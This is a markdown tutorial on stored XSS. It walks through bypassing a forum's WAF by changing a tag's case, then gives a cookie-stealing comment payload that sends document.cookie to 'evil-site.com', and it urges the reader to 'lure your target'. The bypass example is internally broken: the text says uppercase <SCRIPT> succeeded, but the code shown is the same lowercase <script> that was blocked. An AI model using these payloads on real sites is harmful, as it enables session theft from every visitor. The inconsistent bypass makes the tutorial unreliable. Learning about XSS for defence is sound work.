# Persistent XSS

> A **Persistent XSS** or **Stored XSS** is a type of XSS Vulnerability in which a malicious XSS payload is stored in the database of the server which makes the payload _persistent_ and it is sent to users in each following requests. Thus, making the XSS Payload _persistent_. The server **_stores_** the payload through any **influence** from the malicious actor/s but, due to it's own **functionality**.

Unlike Reflected XSS, in Persistent XSS the payload is not delivered directly to the victim but instead delivered indirectly through a vulnerable site.

`Persistent XSS is really hard to catch because, not only the payload is invisible to the user through the natural UI of the browser but also, a proper XSS Payload would just blend into it's environment.`

The most dangerous part of a **Persistent XSS** vulnerability is that, it can effect extremely large number of audiences in very short duration. For example, let's say there is a Persistent XSS vulnerability in a popular website's comment section. If someone uploads a stealthy malicious payload and hundred's of thousands of people view it. Then, everyone who sees the malicious comment would be compromised.

By the time it gets noticed, large number of people would already be affected.

Now let's get practical!

You just received an email from your friend with a URL to a forum's post. You decide to visit it and you see that it has lots of comment.

After reading comments for a while, you decide to test it's Web Application Firewall. So, you insert,

```html
<h1>Hello guys!</h1>
```

into it's comment section.
You don't see a  heading but simple text `Hello guys!`. What happened to the `<h1>` tags?
It's common for websites to filter out HTML tags as a rule for the WAF.

But, some of them might not block all the tags. For bypassing WAF's read here.

Now lets try the usual,

```html
<script>
  alert(1);
</script>
```

Hmm, no luck you get `alert(1)` as the comment. We see that WAF is successfully blocking all the tags including `script` tag. That's a clever WAF, so how are we going to do XSS?

Different WAFs use different techniques to detect HTML tags, some use regex and some use simple string search for HTML tags.

There is always some problem associated with a WAF's method of preventing XSS. For WAFs that search for HTML tags in a string, it can be bypassed easily. You will see how we can bypass them.

Let's enter the following into the comment section,

```html
<script>
  alert(0);
</script>
```

Voila! You get the alert! Easy, isn't it?
Why did `<SCRIPT>` worked but, `<script>` didn't? Because, the WAF of the website was searching and removing the HTML tags based on it's custom wordlist. Now, the wordlist did not have `<SCRIPT>` tag in it making the WAF completely useless.

Now, to steal cookies you would just put,

```html
<SCRIPT>
  document.write(
    "<img src='https://evil-site.com/cookie?cookie=" + document.cookie + " '>"
  );
</SCRIPT>
```

in the comment and lure your target into visiting the post and view the comment.
That is a dangerous piece of code that would steal everyone's cookie who views the page.

**Persistent XSS** are very dangerous and if you are a developer make sure to check for this vulnerabilities beforehand.
The XSS payload for **Persistent XSS** and **Reflected XSS** will mostly be similar but the technique for exploitation would be different depending on the situation.

To read further for WAF Bypassing [visit here](./Bypassing%20WAF.md)!
